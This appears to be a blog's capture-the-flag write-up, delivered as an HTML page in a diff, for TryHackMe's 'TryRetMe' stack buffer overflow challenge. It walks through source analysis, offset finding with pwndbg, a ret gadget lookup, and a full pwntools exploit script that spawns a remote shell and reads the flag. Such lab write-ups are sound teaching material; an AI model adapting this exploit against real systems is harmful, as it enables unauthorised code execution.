@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <title>
+TryRetMe | abund4nt
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="64-bit binary. Buffer Overflow. ret2win.">
+
+<meta name="generator" content="Hugo 0.123.7">
+
+
+<link rel="canonical" href="https://abund4nt.github.io/writeups/tryhackme/trypwnme-one/tryretme/" >
+
+
+
+
+<link href="/css/style.min.e22e1ef80ea19d08625444757176e07586bc5f332072f7ec355fae587dea40c9.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a class="terminal" href="https://abund4nt.github.io/">
+                <span>abund4nt@tryharder ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="https://abund4nt.github.io/about" title="" >
+                        ~/about</a>
+                </li>
+                
+                <li>
+                    <a href="https://abund4nt.github.io/posts" title="" >
+                        ~/posts</a>
+                </li>
+                
+                <li>
+                    <a href="https://abund4nt.github.io/writeups" title="" >
+                        ~/writeups</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>TryRetMe</h1>
+    
+    	<p>64-bit binary. Buffer Overflow. ret2win.</p>
+    
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/pwn/">#Pwn</a></dd>
+            
+            
+            
+            
+                <dt>reading time</dt>
+                <dd>4 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    <div>
+        <p>We are given a binary, its source code and a remote instance to connect to.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">win</span>(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf[<span style="color:#ae81ff">0x20</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Return to where? : &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x200</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">ok, let&#39;s go!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setup</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vuln</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The binary has the following protections.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>Stack:    No canary found
+</span></span><span style="display:flex;"><span>NX:       NX enabled
+</span></span><span style="display:flex;"><span>PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="source-code-analysis">Source code analysis</h2>
+<p>A buffer of 32 pointers is defined in the <code>vuln</code> function, but it is allowed to read up to 512 bytes. This discrepancy allows us to overwrite the stack, compromising the flow of the program. By manipulating the buffer it is possible to redirect execution to the <code>win</code> function, which invokes a <code>/bin/sh</code> system shell making it easy to execute arbitrary code. To check that this program is vulnerable to <em>Buffer Overflow</em> let&rsquo;s run it and send a lot of <code>A</code> characters.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -c <span style="color:#e6db74">&#34;print(b&#39;A&#39; * 450)&#34;</span> | ./tryretme 
+</span></span><span style="display:flex;"><span>Return to where? : 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ok, let<span style="color:#960050;background-color:#1e0010">&#39;</span>s go!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>    <span style="color:#ae81ff">29517</span> segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>  ./tryretme
+</span></span></code></pre></div><p>The program breaks. To start developing the solution exploit we must calculate the offset, in this case I will use <code>gdb</code>. I will create a sequence of alternating characters using <code>cyclic</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; cyclic <span style="color:#ae81ff">450</span>
+</span></span><span style="display:flex;"><span>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacga
+</span></span></code></pre></div><p>We will run the program and calculate the offset.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; run
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
+</span></span><span style="display:flex;"><span>Return to where? : 
+</span></span><span style="display:flex;"><span>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacga
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ok, let<span style="color:#e6db74">&#39;s go!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Program received signal SIGSEGV, Segmentation fault.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x0000000000401236 in vuln ()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> RAX  0x10
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> RBX  0x7fffffffdd78 —▸ 0x7fffffffe0fe ◂— &#39;</span>/home/abund4nt/Desktop/CTF/TryHackMe/TryPwnMe One/materials-TryPwnMeOne/TryRetMe/tryretme<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> RCX  0x7ffff7d1c574 (write+20) ◂— cmp rax, -0x1000 /* &#39;</span>H<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> RDX  0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> RDI  0x7ffff7e05710 (_IO_stdfile_1_lock) ◂— 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> RSI  0x7ffff7e04643 (_IO_2_1_stdout_+131) ◂— 0xe05710000000000a /* &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> R8   0xf
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> R9   0x7ffff7fca380 (_dl_fini) ◂— endbr64 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> R10  0x7ffff7c109d8 ◂— 0x11001200001bd3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> R11  0x202
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> R12  1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> R13  0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> R14  0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> RBP  0x6261616161616168 (&#39;</span>haaaaaab<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> RSP  0x7fffffffdc48 ◂— 0x6261616161616169 (&#39;</span>iaaaaaab<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> RIP  0x401236 (vuln+66) ◂— ret 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">─────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ► 0x401236 &lt;vuln+66&gt;    ret                                &lt;0x6261616161616169&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ↓
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00:0000│ rsp 0x7fffffffdc48 ◂— 0x6261616161616169 (&#39;</span>iaaaaaab<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">01:0008│     0x7fffffffdc50 ◂— 0x626161616161616a (&#39;</span>jaaaaaab<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">02:0010│     0x7fffffffdc58 ◂— 0x626161616161616b (&#39;</span>kaaaaaab<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">03:0018│     0x7fffffffdc60 ◂— 0x626161616161616c (&#39;</span>laaaaaab<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">04:0020│     0x7fffffffdc68 ◂— 0x626161616161616d (&#39;</span>maaaaaab<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">05:0028│     0x7fffffffdc70 ◂— 0x626161616161616e (&#39;</span>naaaaaab<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">06:0030│     0x7fffffffdc78 ◂— 0x626161616161616f (&#39;</span>oaaaaaab<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">07:0038│     0x7fffffffdc80 ◂— 0x6261616161616170 (&#39;</span>paaaaaab<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ► 0         0x401236 vuln+66
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   1 0x6261616161616169 None
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   2 0x626161616161616a None
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   3 0x626161616161616b None
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   4 0x626161616161616c None
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   5 0x626161616161616d None
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   6 0x626161616161616e None
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   7 0x626161616161616f None
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">pwndbg&gt; cyclic -l 0x6261616161616169
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Finding cyclic pattern of 8 bytes: b&#39;</span>iaaaaaab<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">(</span>hex: 0x6961616161616162<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Found at offset <span style="color:#ae81ff">264</span>
+</span></span></code></pre></div><p>The offset is <code>264</code> bytes, with this calculated we must pass the address of the <code>win</code> function to obtain the interactive shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ pwndbg&gt; info address win
+</span></span><span style="display:flex;"><span>Symbol <span style="color:#e6db74">&#34;win&#34;</span> is at 0x4011dd in a file compiled without debugging.
+</span></span></code></pre></div><p>We would need a <code>ret</code> gadget to pass after the offset, we can use <code>ROPGadget</code> for this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ROPgadget --binary tryretme | grep <span style="color:#e6db74">&#34;: ret&#34;</span>
+</span></span><span style="display:flex;"><span>0x000000000040101a : ret
+</span></span></code></pre></div><p>With this we have everything we need to write the exploit.</p>
+<h2 id="flag">Flag</h2>
+<p>With the following script we will be able to solve the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_process</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Usage: python3 script.py &lt;ip:port&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    host, port <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> remote(host, int(port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">264</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x40101a</span>) <span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x00000000004011dd</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> get_process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Return to where? : </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>By executing it we gain the interactive shell and we can read the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 solve-remote-two.py 10.10.18.10:9006
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 10.10.18.10 on port 9006: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ok, let<span style="color:#960050;background-color:#1e0010">&#39;</span>s go!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ uname -a
+</span></span><span style="display:flex;"><span>Linux app 5.15.0-1068-aws <span style="color:#75715e">#74~20.04.1-Ubuntu SMP Tue Aug 6 19:32:13 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>flag.txt
+</span></span><span style="display:flex;"><span>run
+</span></span><span style="display:flex;"><span>$ cat flag.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>a_r3t_to_w1n_by_thm<span style="color:#f92672">}</span>
+</span></span></code></pre></div>
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+    
+</footer>
+    </div>
+
+    
+
+</body>
+
+</html>
